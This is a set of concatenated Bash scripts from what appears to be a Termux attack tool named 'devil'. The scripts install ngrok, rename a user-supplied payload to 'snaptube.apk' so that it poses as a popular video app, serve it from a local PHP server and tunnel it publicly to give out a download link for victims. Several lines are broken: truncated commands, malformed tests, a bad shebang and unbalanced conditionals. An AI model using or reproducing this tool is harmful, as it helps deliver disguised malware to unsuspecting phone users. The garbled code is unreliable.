


if [[ - ngrok ]];
  then
      printf "\e[1;92m[\e[0m+\e[1;92m] you aleady have ngrok \n"
      
  else
      if [[ -e ngrok-stable-linux-arm.zip ]]; then
         /dev/null 2>&1
        chmod +x ngrok
            rm ngrok-stable-linux-arm.zip
            
      else
          l 2>&1 
          if [[ -e ngrok-stable-linux-386.zip ]]; then
              unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
              chmod +x ngrok
              rm -rf ngrok-stable-linux-386.zip
    fi
fi

if [-f ngrok];
    then
        mv /$HOME/devil/ /$PREFIX/
        echo "/$PREFIX/devil/devil.sh" > /$PREFIX/bin/devil
        
        if [-f /$PREFIX/bin/devil];
          
         then
            cd /$PREFIX/devil/
            mkdir /$PREFIX/devil/index/download/
            mkdir /$PREFIX/devil/payload/
            #mkdir /$PREFIX/share/devil/config/
            
            if [[ -e /$PREFIX/devil/index/download ]]; then
              #statements
              if [[ -e /$PREFIX/devil/payload ]]; then
              #statements
              mv /$PREFIX/devil/ngrok /$PREFIX/devil/index/ 
                  printf "\e[1;92m[\e[0m+\e[1;92m] installed \n"
                  
              fi
           else 
              printf "\e[1;93m[!] sorry you have unknown ereor.... \n "
            fi
         
         
         
         else 
            echo "/$PREFIX/devil/devil.sh" > /$PREFIX/bin/devil
        fi
          
          
          
          
          
          
          
       
  else
      printf "\e[1;93m[!] Download error... \n" 
exit 1
fi




#!bin/bash

cd /index/
if [[ -e index.html ]]; then
  #statements
  if [[ -e css/index.css ]]; then
    #statements
    cd /$PREFIX/devil/payload/
    mv * snaptube.apk
    if [[ -e /$PREFIX/devil/payload/snaptube.apk ]]; then
      #statements
      mv /$PREFIX/devil/payload/snaptube.apk /$PREFIX/devil/index/download/
      if [[ -e /$PREFIX/devil/index/download/snaptube.apk ]]; then
        #statements
        if [[ -e /$PREFIX/devil/index/devil_hoster.sh ]]; then
          #statements
          devil_hoster.sh
        fi
        else
            printf "\e[1;93m[!] sorry you have unknown ereor.... \n "
      fi
    fi
    else
        printf "\e[1;93m[!] sorry you have create a payload and save it this location.... \n [ $PREFIX/devil/payload/ ] "
  fi
  else
    printf "\e[1;93m[!] sorry you have unknown ereor"
fi
else
    printf "\e[1;93m[!] sorry you have unknown ereor"




#!bin/bash

cd /$PREFIX/devil/index/
if [[ -e /$PREFIX/devil/index/download/snaptube.apk ]]; then
  #statements
  if [[ -e command -v php > /dev/null 2>&1 ]]; then
    #statements
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:6666 > /dev/null 2>&1 & 
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok http 6666 > /dev/null 2>&1 &
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
    
  fi
  else
    printf "\e[1;93m[!] sorry you have unknown ereor \n"
fi
  
  
  
fi












